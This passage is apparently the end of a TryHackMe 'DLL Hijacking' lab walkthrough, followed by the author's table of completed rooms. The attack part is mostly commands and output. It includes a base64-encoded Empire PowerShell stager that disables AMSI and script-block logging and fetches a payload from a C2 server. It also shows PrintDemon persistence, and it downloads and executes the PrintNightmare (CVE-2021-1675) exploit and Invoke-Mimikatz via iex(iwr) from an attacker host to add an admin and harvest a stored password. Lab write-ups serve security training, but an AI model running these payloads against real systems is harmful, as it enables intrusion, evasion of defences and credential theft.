*Evil-WinRM* PS C:\Users\Sam\Documents> powershell -noP -sta -w 1 -enc  SQBGACgAJABQAFMAVgBlAFIAcwBpAE...8AUgAgAC0ARwBFACAAMwApAHsAJABiADcAZgA0AD0AWwByAEUAZgBdAC4AQQBTAFMAZQBtAGIAbABZAC4ARwBFAHQAVAB5AFAARQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAFUAdABpAGwAcwAnACkALgAiAEcAZQBUAEYAaQBFAGAAbABkACIAKAAnAGMAYQBjAGgAZQBkAEcAcgBvAHUAcABQAG8AbABpAGMAeQBTAGUAdAB0AGkAbgBnAHMAJwAsACcATgAnACsAJwBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwBJAGYAKAAkAGIANwBmADQAKQB7ACQAYgAzADkAOQA9ACQAQgA3AGYANAAuAEcARQB0AFYAQQBMAFUAZQAoACQATgB1AGwATAApADsASQBGACgAJABCADMAOQA5AFsAJwBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0AKQB7ACQAYgAzADkAOQBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJABCADMAOQA5AFsAJwBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0AWwAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAbABvAGMAawBJAG4AdgBvAGMAYQB0AGkAbwBuAEwAbwBnAGcAaQBuAGcAJwBdAD0AMAB9ACQAdgBhAGwAPQBbAEMATwBsAGwARQBDAHQASQBvAE4AcwAuAEcARQBuAGUAUgBJAEMALgBEAEkAQwBUAGkATwBuAEEAcgBZAFsAcwBUAHIASQBOAGcALABTAHkAUwB0AEUAbQAuAE8AQgBKAEUAQwB0AF0AXQA6ADoAbgBFAFcAKAApADsAJAB2AGEAbAAuAEEARABkACgAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnACwAMAApADsAJAB2AEEATAAuAEEAZABEACgAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCAGwAbwBjAGsASQBuAHYAbwBjAGEAdABpAG8AbgBMAG8AZwBnAGkAbgBnACcALAAwACkAOwAkAGIAMwA5ADkAWwAnAEgASwBFAFkAXwBMAE8AQwBBAEwAXwBNAEEAQwBIAEkATgBFAFwAUwBvAGYAdAB3AGEAcgBlAFwAUABvAGwAaQBjAGkAZQBzAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzAFwAUABvAHcAZQByAFMAaABlAGwAbABcAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQA9ACQAdgBBAEwAfQBFAGwAcwBFAHsAWwBTAGMAcgBpAHAAVABCAEwAbwBjAGsAXQAuACIARwBFAHQARgBpAEUAYABsAEQAIgAoACcAcwBpAGcAbgBhAHQAdQByAGUAcwAnACwAJwBOACcAKwAnAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMAZQB0AFYAYQBMAHUARQAoACQATgBVAGwAbAAsACgATgBFAFcALQBPAGIAagBFAGMAdAAgAEMATwBsAGwARQBDAHQAaQBvAE4AcwAuAEcAZQBOAEUAUgBpAGMALgBIAGEAUwBIAFMARQB0AFsAcwBUAHIASQBuAGcAXQApACkAfQAkAFIAZQBGAD0AWwBSAGUAZgBdAC4AQQBzAHMARQBNAGIATABZAC4ARwBlAHQAVAB5AHAAZQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAbQBzAGkAJwArACcAVQB0AGkAbABzACcAKQA7ACQAUgBFAEYALgBHAEUAdABGAEkARQBsAGQAKAAnAGEAbQBzAGkASQBuAGkAdABGACcAKwAnAGEAaQBsAGUAZAAnACwAJwBOAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMARQBUAFYAYQBMAHUARQAoACQAbgBVAGwATAAsACQAdAByAFUAZQApADsAfQA7AFsAUwBZAHMAVABlAG0ALgBOAGUAVAAuAFMARQByAFYASQBDAGUAUABvAEkATgB0AE0AQQBuAEEARwBFAFIAXQA6ADoARQB4AFAARQBDAHQAMQAwADAAQwBPAG4AdABpAE4AdQBFAD0AMAA7ACQARQBiAGQARAA9AE4AZQBXAC0ATwBiAGoAZQBDAHQAIABTAFkAcwB0AGUATQAuAE4ARQBUAC4AVwBFAGIAQwBsAGkAZQBuAHQAOwAkAHUAPQAnAE0AbwB6AGkAbABsAGEALwA1AC4AMAAgACgAVwBpAG4AZABvAHcAcwAgAE4AVAAgADYALgAxADsAIABXAE8AVwA2ADQAOwAgAFQAcgBpAGQAZQBuAHQALwA3AC4AMAA7ACAAcgB2ADoAMQAxAC4AMAApACAAbABpAGsAZQAgAEcAZQBjAGsAbwAnADsAJABzAGUAcgA9ACQAKABbAFQAZQBYAHQALgBFAE4AQwBvAEQAaQBOAEcAXQA6ADoAVQBuAGkAYwBvAGQARQAuAEcARQBUAFMAVAByAEkATgBHACgAWwBDAE8AbgBWAGUAcgB0AF0AOgA6AEYAUgBvAG0AQgBBAHMARQA2ADQAUwB0AHIASQBuAEcAKAAnAGEAQQBCADAAQQBIAFEAQQBjAEEAQQA2AEEAQwA4AEEATAB3AEEAeABBAEQAQQBBAEwAZwBBAHkAQQBEAEEAQQBNAFEAQQB1AEEARABNAEEATABnAEEAeABBAEQARQBBAE4AQQBBADYAQQBEAFEAQQBPAFEAQQAxAEEAQQA9AD0AJwApACkAKQA7ACQAdAA9ACcALwBsAG8AZwBpAG4ALwBwAHIAbwBjAGUAcwBzAC4AcABoAHAAJwA7ACQARQBCAGQARAAuAEgARQBBAEQAZQBSAFMALgBBAGQARAAoACcAVQBzAGUAcgAtAEEAZwBlAG4AdAAnACwAJAB1ACkAOwAkAGUAYgBEAGQALgBQAHIAbwBYAFkAPQBbAFMAeQBTAFQARQBNAC4ATgBFAHQALgBXAEUAYgBSAEUAcQBVAEUAcwBUAF0AOgA6AEQARQBmAEEAVQBMAFQAVwBlAGIAUABSAE8AeABZADsAJABFAGIARABkAC4AUAByAE8AWAB5AC4AQwByAGUAZABFAE4AdABpAGEAbABzACAAPQAgAFsAUwBZAFMAVABFAE0ALgBOAEUAVAAuAEMAcgBFAEQARQBOAHQASQBhAEwAQwBhAGMASABlAF0AOgA6AEQARQBmAEEAVQBsAHQATgBlAFQAdwBPAHIAawBDAHIARQBEAGUAbgB0AEkAYQBMAHMAOwAkAFMAYwByAGkAcAB0ADoAUAByAG8AeAB5ACAAPQAgACQAZQBiAGQAZAAuAFAAcgBvAHgAeQA7ACQASwA9AFsAUwBZAFMAdABlAG0ALgBUAEUAWABUAC4ARQBOAEMATwBEAGkAbgBHAF0AOgA6AEEAUwBDAEkASQAuAEcAZQBUAEIAWQB0AGUAcwAoACcAYQB3AFgAVQBEAGsAaQB0ADwAbwBWADkASgBjAFIATwBMAHsAJQBnAFEALgB8ADMAbgBIAHEATQBwAEEALwBsACcAKQA7ACQAUgA9AHsAJABEACwAJABLAD0AJABBAHIAZwBTADsAJABTAD0AMAAuAC4AMgA1ADUAOwAwAC4ALgAyADUANQB8ACUAewAkAEoAPQAoACQASgArACQAUwBbACQAXwBdACsAJABLAFsAJABfACUAJABLAC4AQwBPAHUATgBUAF0AKQAlADIANQA2ADsAJABTAFsAJABfAF0ALAAkAFMAWwAkAEoAXQA9ACQAUwBbACQASgBdACwAJABTAFsAJABfAF0AfQA7ACQARAB8ACUAewAkAEkAPQAoACQASQArADEAKQAlADIANQA2ADsAJABIAD0AKAAkAEgAKwAkAFMAWwAkAEkAXQApACUAMgA1ADYAOwAkAFMAWwAkAEkAXQAsACQAUwBbACQASABdAD0AJABTAFsAJABIAF0ALAAkAFMAWwAkAEkAXQA7ACQAXwAtAGIAeABPAHIAJABTAFsAKAAkAFMAWwAkAEkAXQArACQAUwBbACQASABdACkAJQAyADUANgBdAH0AfQA7ACQAZQBiAEQAZAAuAEgARQBhAEQARQBSAFMALgBBAEQAZAAoACIAQwBvAG8AawBpAGUAIgAsACIATABHAGMAbQBHAE4AYwBCAEUAPQBRAHEAWABSAEwANgBjAEYATwBRAEgARABzAE8AcwBLAE8AYwBjAGgAUwB1AHoAMQBhAEYAbwA9ACIAKQA7ACQARABhAHQAQQA9ACQAZQBiAEQARAAuAEQATwBXAG4ATABPAEEAZABEAGEAVABhACgAJABzAEUAcgArACQAdAApADsAJABpAHYAPQAkAGQAYQBUAEEAWwAwAC4ALgAzAF0AOwAkAGQAYQB0AEEAPQAkAEQAQQB0AGEAWwA0AC4ALgAkAEQAYQB0AEEALgBsAGUATgBHAHQAaABdADsALQBqAG8AaQBuAFsAQwBoAEEAUgBbAF0AXQAoACYAIAAkAFIAIAAkAEQAQQBUAGEAIAAoACQASQBWACsAJABLACkAKQB8AEkARQBYAA==
```

```bash
[+] Print Job Started on PrintDemon
[+] Completed registry persistence, waiting on system restart...
(Empire: powershell/privesc/printdemon) > 
[*] Sending POWERSHELL stager (stage 1) to TargetIP
[*] New agent 94G678XN checked in
[+] Initial agent 94G678XN from xx.xxx.xx.xxx now active (Slack)
[*] Sending agent (stage 2) to 94G678XN at TargetIP
(Empire: powershell/privesc/printdemon) > agents

[*] Active agents:

 Name     La Internal IP     Machine Name      Username                Process            PID    Delay    Last Seen            Listener
 ----     -- -----------     ------------      --------                -------            ---    -----    ---------            ----------------
 AK289BDW ps 0.0.0.0         DESKTOP-E920628   DESKTOP-E920628\Sam     powershell         3296   5/0.0    2025-08-07 xx:xx:xx  http            
 89HYGTK3 ps TargetIP        DESKTOP-E920628   DESKTOP-E920628\Sam     explorer           3368   5/0.0    2025-08-07 xx:xx:xx  http            
 
(Empire: agents) > interact 89HYGTK3
(Empire: 89HYGTK3) > usemodule management/restart
(Empire: powershell/management/restart) > execute
[>] Module is not opsec safe, run? [y/N] y
[*] Tasked 89HYGTK3 to run TASK_CMD_WAIT
[*] Agent 89HYGTK3 tasked with task ID 3
[*] Tasked agent 89HYGTK3 to run module powershell/management/restart
(Empire: powershell/management/restart) > 
Restarting computer

[*] Sending POWERSHELL stager (stage 1) to TargetIP
[*] New agent PNW1B8Y3 checked in
[+] Initial agent PNW1B8Y3 from 10.201.72.205 now active (Slack)
[*] Sending agent (stage 2) to PNW1B8Y3 at TargetIP
```

<br>
<h2>Task 9 . Network Persistence</h2>

<p><em>Answer the question below</em></p>

<p>9.1. What is the name of the DLL that is written to System32?<br>
<code>Ualapi.dll</code></p>

<p>https://github.com/BC-SECURITY/Invoke-PrintDemon?tab=readme-ov-file</p>

<img width="1251" height="567" alt="image" src="https://github.com/user-attachments/assets/29b7b040-2dff-4861-8fe3-b2bc769293f2" />

<br>

<h2>Task 10 . Bonus Points: Find Other Users</h2>
<p>Take a look around and find if anyone else uses this machine.</p>

<p><em>Answer the question below</em></p>

<p>10.1. What is the other user on the machine?<br>
<code>John</code></p>

<img width="873" height="218" alt="image" src="https://github.com/user-attachments/assets/4d69298b-e7f7-4c7f-a515-9616073c6c6e" />

```bash
:~/DLLHijacking# wget https://raw.githubusercontent.com/calebstewart/CVE-2021-1675/main/CVE-2021-1675.ps1
```

```bash
:~/DLLHijacking# python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
xx.xxx.xx.xx - - [17/Sep/2025 xx:xx:xx] "GET /CVE-2021-1675.ps1 HTTP/1.1" 200 -
```

```bash
*Evil-WinRM* PS C:\Users\Sam\Documents> iex (iwr -usebasicparsing http://xx.xx.xx.xxx:8000/CVE-2021-1675.ps1)
*Evil-WinRM* PS C:\Users\Sam\Documents> invoke-nightmare
[+] using default new user: *****
[+] using default new password: ********
[+] created payload at C:\Users\Sam\AppData\Local\Temp\nightmare.dll
[+] using pDriverPath = "C:\WINDOWS\System32\DriverStore\FileRepository\ntprint.inf_amd64_17a1dc11390402e0\Amd64\mxdwdrv.dll"
[+] added user  as local administrator
[+] deleting payload from C:\Users\Sam\AppData\Local\Temp\nightmare.dll
*Evil-WinRM* PS C:\Users\Sam\Documents> 
```

```bash
:~/DLLHijacking# evil-winrm -i xx.xxx.xx.xx -u ***** -p ********
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\*****\Documents> 
```

```bash
*Evil-WinRM* PS C:\Users\*****\Documents> whoami
desktop-e920628\*****
```

```bash
*Evil-WinRM* PS C:\Users\*****\Documents> whoami /all

USER INFORMATION
----------------

User Name             SID
===================== ==============================================
desktop-e920628\***** S-*-*-**-**********-**********-**********-****


GROUP INFORMATION
-----------------

Group Name                                                    Type             SID          Attributes
============================================================= ================ ============ ===============================================================
Everyone                                                      Well-known group S-*-*-*      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account and member of Administrators group Well-known group S-*-*-***    Mandatory group, Enabled by default, Enabled group
BUILTIN\Administrators                                        Alias            S-*-*-**-*** Mandatory group, Enabled by default, Enabled group, Group owner
BUILTIN\Users                                                 Alias            S-*-*-**-*** Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                                          Well-known group S-*-*-*      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users                              Well-known group S-*-*-**     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization                                Well-known group S-*-*-**     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account                                    Well-known group S-*-*-***    Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication                              Well-known group S-*-*-**-**  Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level                          Label            S-*-**-*****


PRIVILEGES INFORMATION
----------------------

Privilege Name                  Description                               State
=============================== ========================================= =======
SeIncreaseQuotaPrivilege        Adjust memory quotas for a process        Enabled
SeSecurityPrivilege             Manage auditing and security log          Enabled
SeTakeOwnershipPrivilege        Take ownership of files or other objects  Enabled
SeLoadDriverPrivilege           Load and unload device drivers            Enabled
SeSystemProfilePrivilege        Profile system performance                Enabled
SeSystemtimePrivilege           Change the system time                    Enabled
SeProfileSingleProcessPrivilege Profile single process                    Enabled
SeIncreaseBasePriorityPrivilege Increase scheduling priority              Enabled
SeCreatePagefilePrivilege       Create a pagefile                         Enabled
SeBackupPrivilege               Back up files and directories             Enabled
SeRestorePrivilege              Restore files and directories             Enabled
SeShutdownPrivilege             Shut down the system                      Enabled
SeDebugPrivilege                Debug programs                            Enabled
SeSystemEnvironmentPrivilege    Modify firmware environment values        Enabled
SeChangeNotifyPrivilege         Bypass traverse checking                  Enabled
SeRemoteShutdownPrivilege       Force shutdown from a remote system       Enabled
SeUndockPrivilege               Remove computer from docking station      Enabled
SeManageVolumePrivilege         Perform volume maintenance tasks          Enabled
SeImpersonatePrivilege          Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege         Create global objects                     Enabled
SeIncreaseWorkingSetPrivilege   Increase a process working set            Enabled
SeTimeZonePrivilege             Change the time zone                      Enabled
SeCreateSymbolicLinkPrivilege   Create symbolic links                     Enabled

*Evil-WinRM* PS C:\Users\adm1n\Documents> 
```

```bash
:~/DLLHijacking# wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1
```

```bash
*Evil-WinRM* PS C:\Users\*****\Documents> iex (iwr -usebasicparsing http://xx.xxx.xx.xxx:8000/Invoke-Mimikatz.ps1)
```

```bash
:~/DLLHijacking# python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
xx.xxx.xx.xx - - [17/Sep/2025 xx:xx:xx] "GET /Invoke-Mimikatz.ps1 HTTP/1.1" 200 -
```

```bash
    Directory: C:\Users


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        9/17/2025   5:46 PM                *****
d-----        5/29/2020   7:12 PM                xxxx
d-r---        5/29/2020   8:04 PM                Public
d-----        5/29/2020   9:02 PM                Sam


*Evil-WinRM* PS C:\Users> cd xxxx
*Evil-WinRM* PS C:\Users\xxxx> dir


    Directory: C:\Users\xxxx


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-r---        5/29/2020   7:12 PM                3D Objects
d-r---        5/29/2020   7:12 PM                Contacts
d-r---        5/29/2020   9:40 PM                Desktop
d-r---        5/29/2020  11:19 PM                Documents
d-r---        5/29/2020   7:12 PM                Downloads
d-r---        5/29/2020   7:12 PM                Favorites
d-r---        5/29/2020   7:12 PM                Links
d-r---        5/29/2020   7:12 PM                Music
d-r---        5/29/2020   9:08 AM                OneDrive
d-r---        5/29/2020   7:12 PM                Pictures
d-r---        5/29/2020   7:12 PM                Saved Games
d-r---        5/29/2020   7:12 PM                Searches
d-r---        5/29/2020  11:18 PM                Videos


*Evil-WinRM* PS C:\Users\xxxx> cd Desktop
*Evil-WinRM* PS C:\Users\xxxx\Desktop> dir


    Directory: C:\Users\xxxx\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        5/29/2020   7:13 PM           1446 Microsoft Edge.lnk
-a----        5/29/2020   5:33 PM            365 startscript.ps1


*Evil-WinRM* PS C:\Users\xxxx\Desktop> 
```

```bash
*Evil-WinRM* PS C:\Users\xxxx\Desktop> type startscript.ps1
$pwd1 = "******************"
$user = 'xxxx'
$pwd = ConvertTo-SecureString -String $pwd1 -AsPlainText -Force
$Credential = New-Object System.Management.Automation.PSCredential $user, $pwd
Start-Process -FilePath "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -Credential $Credential -WorkingDirectory "C:\Windows\System32\WindowsPowerShell\v1.0\"
*Evil-WinRM* PS C:\Users\xxxx\Desktop> 
```

<br>

<h2>Task 11 . Bonus Points: Steal Admin Credentials</h2>

<p><em>Answer the question below</em></p>

<p>11.1. What is the other user´s password?<br>
<code>******************</code></p>

<br>

<h2>Task 12 . Down the Rabbit Hole</h2>

<p><em>Answer the question below</em></p>

<p>12.1. #HackThePlanet<br>
<code>No answer needed</code></p>

<br>
<br>


<h1 align="center">Completed</h1>
<p align="center"><img width="1200px" src="https://github.com/user-attachments/assets/94e1e1a6-4cf5-4c09-b77b-289ebb6871f9"><br>
                  <img width="1200px" src="https://github.com/user-attachments/assets/549e90e6-0a7d-48d5-900a-587ba202a2f7"></p>


<br>

<h1 align="center">My TryHackMe Journey ・ 2025, September</h1>

<div align="center"><h6>

| Date   | Room                                  |Streak   |All Time<br>Global|All Time<br>Brazil|Monthly<br>Global|Monthly<br>Brazil|Points|Rooms<br>Completed|Badges|
|:------:|:--------------------------------------|--------:|------------:|-------------:|------------:|------------:|------------:|------------:|------------:|
|17      |Medium 🔗 - <code><strong>DLL Hijacking</strong></code>| 499| 106ᵗʰ| 4ᵗʰ      |     348ᵗʰ   |     7ᵗʰ    | 126,554  |    969    |    75     |
|17      |Medium 🔗 - The Docker Rodeo           | 499    |     106ᵗʰ    |      4ᵗʰ     |     346ᵗʰ   |     7ᵗʰ    | 126,546  |    968    |    75     |
|17      |Easy 🔗 - Linux Logging for SOC        | 499    |     106ᵗʰ    |      4ᵗʰ     |     345ᵗʰ   |     7ᵗʰ    | 126,538  |    967    |    74     |
|16      |Hard 🚩 - TryHack3M: TriCipher Summit  | 498    |     107ᵗʰ    |      4ᵗʰ     |     364ᵗʰ   |     7ᵗʰ    | 126,420  |    966    |    74     |
|16      |Easy 🔗 - Chaining Vulnerabilities     | 498    |     108ᵗʰ    |      5ᵗʰ     |     365ᵗʰ   |     7ᵗʰ    | 126,420  |    965    |    74     |
|15      |Medium 🔗 - AppSec IR                  | 497    |     108ᵗʰ    |      5ᵗʰ     |     352ⁿᵈ   |     7ᵗʰ    | 126,404  |    964    |    74     |
|14      |Hard 🚩 - Misguided Ghosts, in progress| 496    |     108ᵗʰ    |      5ᵗʰ     |     389ᵗʰ   |     6ᵗʰ    | 126,300  |    963    |    74     |
|14      |Hard 🚩 - VulnNet: Endgame             | 496    |     108ᵗʰ    |      5ᵗʰ     |     394ᵗʰ   |     6ᵗʰ    | 126,270  |    963    |    74     |
|13      |Hard 🚩 - Royal Router                 | 495    |     107ᵗʰ    |      5ᵗʰ     |     388ᵗʰ   |     6ᵗʰ    | 126,160  |    962    |    74     |
|13      |Medium 🚩 - Void Execution             | 495    |     107ᵗʰ    |      5ᵗʰ     |     383ʳᵈ   |     6ᵗʰ    | 126,120  |    961    |    73     |
|12      |Easy 🚩 - Invite Only                  | 494    |     110ᵗʰ    |      5ᵗʰ     |     352ⁿᵈ   |     6ᵗʰ    | 126,056  |    960    |    73     |
|12      |Medium 🚩 - Devie                      | 494    |     110ᵗʰ    |      5ᵗʰ     |     607ᵗʰ   |     9ᵗʰ    | 125,606  |    959    |    73     |
|11      |Medium 🚩 - Backtrack, in progress     | 493    |     110ᵗʰ    |      5ᵗʰ     |     629ᵗʰ   |     9ᵗʰ    | 125,516  |    958    |    73     |
|11      |Easy 🔗 - Detecting Web Attacks        | 493    |     110ᵗʰ    |      5ᵗʰ     |     629ᵗʰ   |     9ᵗʰ    | 125,516  |    958    |    73     |
|10      |Easy 🔗 - Attacking ICS Plant #1       | 492    |     110ᵗʰ    |      5ᵗʰ     |     675ᵗʰ   |     9ᵗʰ    | 125,428  |    957    |    73     |
|10      |Easy 🔗 - SOC Role in Blue Team        | 492    |     110ᵗʰ    |      5ᵗʰ     |     664ᵗʰ   |     9ᵗʰ    | 125,292  |    956    |    73     |
|9       |Hard 🚩 - Python Playground            | 491    |     111ˢᵗ    |      5ᵗʰ     |     693ʳᵈ   |     9ᵗʰ    | 125,236  |    955    |    73     |
|9       |Hard 🚩 - Borderlands                  | 491    |     111ˢᵗ    |      5ᵗʰ     |     713ʳᵈ   |    10ᵗʰ    | 125,146  |    954    |    73     |
|9       |Medium 🚩 - Forgotten Implant          | 491    |     112ⁿᵈ    |      5ᵗʰ     |     660ᵗʰ   |    10ᵗʰ    | 125,016  |    953    |    73     |
|8       |Easy 🔗 - Web Enumeration              | 490    |     112ⁿᵈ    |      5ᵗʰ     |     663ʳᵈ    |    10ᵗʰ    | 124,986  |    952    |    73     |
|8       |Easy 🔗 - iOS: Forensics               | 490    |     113ʳᵈ    |      5ᵗʰ     |     548ᵗʰ    |     9ᵗʰ    | 124,850  |    951    |    73     |
|7       |Medium 🚩 - VulnNet: Active            | 489    |     114ᵗʰ    |      5ᵗʰ     |     542ⁿᵈ    |     9ᵗʰ    | 124,746  |    950    |    73     |
|7       |Medium 🚩 - pyLon                      | 489    |     114ᵗʰ    |      5ᵗʰ     |     535ᵗʰ    |     9ᵗʰ    | 124,716  |    949    |    73     |
|7       |Medium 🚩 - Pressed                    | 489    |     113ʳᵈ    |      5ᵗʰ     |     508ᵗʰ    |     9ᵗʰ    | 124,886  |    948    |    73     |
|6       |Easy 🚩 - Classic Passwd               | 488    |     114ᵗʰ    |      5ᵗʰ     |     683ʳᵈ    |    12ⁿᵈ    | 124,476  |    947    |    73     |
|6       |Medium 🚩 - toc2                       | 488    |     114ᵗʰ    |      5ᵗʰ     |     695ᵗʰ    |    12ⁿᵈ    | 124,446  |    946    |    73     |
|6       |Hard 🚩 - Extract                      | 488    |     114ᵗʰ    |      5ᵗʰ     |     716ᵗʰ    |    13ʳᵈ    | 124,386  |    945    |    73     |
|6       |Medium 🚩 - Plotted-EMR                | 488    |     114ᵗʰ    |      5ᵗʰ     |     844ᵗʰ    |    12ⁿᵈ    | 124,326  |    944    |    73     |
|5       |Medium 🚩 - Inferno                    | 487    |     114ᵗʰ    |      5ᵗʰ     |     758ᵗʰ    |    12ⁿᵈ    | 124,236  |    943    |    73     |
|5       |Easy 🔗 - Psycho Break                 | 487    |     115ᵗʰ    |      5ᵗʰ     |     724ᵗʰ    |    10ᵗʰ    | 124,152  |    942    |    73     |
|4       |Medium 🚩 - Cold VVars                 | 486    |     113ʳᵈ    |      5ᵗʰ     |     579ᵗʰ    |    10ᵗʰ    | 124,048  |    941    |    73     |
|4       |Medium 🔗 - IP and Domain Threat Intel | 486    |     113ʳᵈ    |	     5ᵗʰ    |     579ᵗʰ     |    10ᵗʰ    | 124,018  |   940     |    73     |
|3       |Easy 🔗 - Malware Classification       | 485    |     112ⁿᵈ    |      5ᵗʰ     |     714ᵗʰ    |    13ʳᵈ    | 123,882  |    939    |    73     |
|2       |Medium 🔗 - Session Forensics          | 484    |     111ˢᵗ    |      5ᵗʰ     |     706ᵗʰ    |    14ᵗʰ    | 123,786  |    938    |    73     |
|1       |Medium 🚩 - Voyage                     | 483    |     111ˢᵗ    |      5ᵗʰ     |     849ᵗʰ    |    15ᵗʰ    | 123,636  |    937    |    73     |

</h6></div><br>

<br>

<p align="center">Global All Time:   106ᵗʰ<br><img width="250px"  src="https://github.com/user-attachments/assets/1391de71-f916-4ec5-afd6-a3835dbb72d1"><br>
                                              <img width="1200px" src="https://github.com/user-attachments/assets/a2bcdcaa-15da-48eb-addc-ca54e42e1823"><br><br>
                  Brazil All Time:     4ᵗʰ<br><img width="1200px" src="https://github.com/user-attachments/assets/630ca342-2fe3-41a7-9673-7bda964badec"><br>
                  Global monthly:    348ᵗʰ<br><img width="1200px" src="https://github.com/user-attachments/assets/f935949c-d0a8-4442-95e2-8bb03859d0ff"><br>
                  Brazil monthly:      7ᵗʰ<br><img width="1200px" src="https://github.com/user-attachments/assets/9304673e-2213-4e6e-9542-f2c73984aed0"><br>

<h1 align="center">Thanks for coming!</h1>
<p align="center">Follow me on <a href="https://medium.com/@RosanaFS">Medium</a>, here on <a href="https://github.com/RosanaFSS/TryHackMe">GitHub</a>, and on <a href="https://www.linkedin.com/in/rosanafssantos/">LinkedIN</a>.</p>
